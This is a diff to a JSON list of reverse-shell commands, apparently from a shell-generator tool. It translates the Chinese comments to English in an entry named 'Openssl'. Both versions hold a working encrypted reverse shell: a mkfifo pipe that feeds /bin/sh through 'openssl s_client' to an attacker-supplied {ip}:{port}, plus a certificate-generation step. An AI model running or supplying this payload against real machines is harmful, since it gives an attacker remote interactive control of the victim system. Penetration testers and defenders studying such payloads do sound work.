@@ -262,7 +262,7 @@
         },
         {
             "name": "Openssl",
-            "command": "# 生成密钥\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n# 在目标机器上回弹\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s\n",
+            "command": "# GenerateKey\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n# ReboundOnTheTargetMachine\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s\n",
             "meta": ["linux", "mac", "windows"]
         }
     ]
